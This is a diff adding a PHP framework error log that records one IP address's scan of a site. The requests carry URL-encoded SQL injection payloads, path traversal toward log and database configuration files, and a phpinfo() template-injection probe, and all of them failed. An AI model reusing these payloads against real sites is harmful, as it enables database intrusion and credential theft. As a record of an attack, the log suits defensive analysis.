@@ -1,0 +1,42 @@
+[ 2016-02-01T02:36:16+08:00 ] 121.42.0.37 /index.php/weblinks-categories?id=0%20%29%20union%20select%20md5%28233333%29%20from%20%60k59cv_users%60%20--%20%29
+ERR: 无法加载控制器:Weblinks-categories
+
+[ 2016-02-01T02:38:48+08:00 ] 121.42.0.37 /index.php/search/index/type-music-keyword-a%27%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28md5(233333)%20version%28%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29and%272%27=%272.htm
+ERR: 无法加载控制器:Search
+
+[ 2016-02-01T02:38:59+08:00 ] 121.42.0.37 /index.php?m=buy/admin&s=add_cat
+ERR: 无法加载控制器:AddCat
+
+[ 2016-02-01T02:39:11+08:00 ] 121.42.0.37 /index.php?m=download/admin&s=order_update
+ERR: 无法加载控制器:OrderUpdate
+
+[ 2016-02-01T02:39:40+08:00 ] 121.42.0.37 /index.php?m=tg/admin&s=delivery_address
+ERR: 无法加载控制器:DeliveryAddress
+
+[ 2016-02-01T02:42:15+08:00 ] 121.42.0.37 /index.php?s=my-show-id-\..\Runtime\Logs\16_02_01.log
+ERR: 无法加载控制器:My-show-id-\..\Runtime\Logs\16_02_01
+
+[ 2016-02-01T02:48:48+08:00 ] 121.42.0.37 /index.php?m=message
+ERR: 无法加载控制器:Message
+
+[ 2016-02-01T02:49:32+08:00 ] 121.42.0.37 /index.php?m=poster&c=index&a=poster_click&id=1
+ERR: 无法加载控制器:Poster
+
+[ 2016-02-01T02:50:21+08:00 ] 121.42.0.37 /index.php?m=wap&c=index&a=comment_list&commentid=content_12%2527%20or%20updatexml(1,concat(0x7e,(version())),0)%23-84-1
+ERR: 无法加载控制器:Wap
+
+[ 2016-02-01T03:00:20+08:00 ] 121.42.0.37 /index.php?m=vote&c=index&a=post&subjectid=1
+ERR: 无法加载控制器:Vote
+
+[ 2016-02-01T03:06:33+08:00 ] 121.42.0.37 /index.php/module/action/param1/%7B$%7Bphpinfo()%7D%7D_
+ERR: 无法加载控制器:Module
+
+[ 2016-02-01T03:07:07+08:00 ] 121.42.0.37 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+ERR: 无法加载控制器:Goods
+
+[ 2016-02-01T03:08:57+08:00 ] 121.42.0.37 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+ERR: 无法加载控制器:Search
+
+[ 2016-02-01T03:31:20+08:00 ] 121.42.0.37 /index.php?s=my-show-id-\..\Runtime\Logs\16_02_01.log
+ERR: 无法加载控制器:My-show-id-\..\Runtime\Logs\16_02_01
+
